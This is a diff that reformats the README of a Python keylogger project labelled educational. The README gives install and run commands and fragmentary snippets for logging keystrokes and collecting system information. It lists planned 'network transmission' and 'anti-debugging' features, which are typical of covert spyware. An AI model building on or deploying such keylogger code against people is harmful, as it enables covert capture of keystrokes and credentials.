@@ -1,4 +1,4 @@
- Python Keylogger - Educational Project
+# Python Keylogger 
 
 **A Python-based keylogger implementation demonstrating keyboard monitoring and system information collection. For educational/research purposes only.**
 
@@ -30,20 +30,23 @@ This project is intended **strictly for educational purposes**. Unauthorized use
 ```bash
 git clone https://github.com/yourusername/python-keylogger.git
 cd python-keylogger
-2. **Install dependencies**:
-bash
-Copy
-pip install pynput requests
-3. **Run keylogger**:
-bash
-Copy
-python keylogger.py
-Logs will be saved to key_log.txt in the project directory.
+```
 
-**Configuration**
-Customize in keylogger.py:
-python
-Copy
+2. **Install dependencies**:
+```bash
+pip install pynput requests
+```
+
+3. **Run keylogger**:
+```bash
+python keylogger.py
+```
+
+Logs will be saved to `key_log.txt` in the project directory.
+
+## Configuration
+Customize in `keylogger.py`:
+```python
 # Change log location
 LOG_DIRECTORY = "/path/to/custom/folder/"
 
@@ -52,18 +55,20 @@ logging.basicConfig(
     format="[%(asctime)s] %(message)s",
     datefmt="%d-%b-%Y %H:%M:%S"
 )
-Code Snippets
-1. System Information Collection
-python
-Copy
+```
+
+## Code Snippets
+### 1. System Information Collection
+```python
 def collect_system_info():
     """Gather device metadata"""
     hostname = socket.gethostname()
     logging.info(f"OS Version: {platform.system()} {platform.release()}")
     logging.info(f"Architecture: {platform.machine()}")
-2. Key Press Handler
-python
-Copy
+```
+
+### 2. Key Press Handler
+```python
 def on_key_press(key):
     """Process keyboard input"""
     try:
@@ -75,29 +80,26 @@ def on_key_press(key):
             logging.info(str(key).replace("'", ""))
     except Exception as e:
         logging.error(f"Key processing error: {str(e)}")
-Ethical Guidelines
-🛑 Legal Compliance: Always obtain written consent before testing
+```
 
-🔐 Data Security: Treat logs as sensitive information
+## Ethical Guidelines
+- 🛑 **Legal Compliance**: Always obtain written consent before testing
+- 🔐 **Data Security**: Treat logs as sensitive information
+- ⚠️ **Responsible Disclosure**: Never deploy on unauthorized systems
+- 🧹 **Cleanup**: Remove all logs after educational use
 
-⚠️ Responsible Disclosure: Never deploy on unauthorized systems
+## Future Enhancements
+- GUI configuration panel
+- Log file encryption
+- Network transmission module
+- Anti-debugging techniques
+- Usage time limitations
 
-🧹 Cleanup: Remove all logs after educational use
+## License
+MIT License - See [LICENSE](LICENSE) for details
 
-Future Enhancements
-GUI configuration panel
+## Contact
+For educational inquiries: sabihhuda3@gmail.com  
+**Note:** This project is not maintained for production use - created purely for academic demonstration.
+```
 
-Log file encryption
-
-Network transmission module
-
-Anti-debugging techniques
-
-Usage time limitations
-
-License
-MIT License - See LICENSE for details
-
-Contact
-For educational inquiries: sabihhuda3@gmail.com
-Note: This project is not maintained for production use - created purely for academic demonstration.
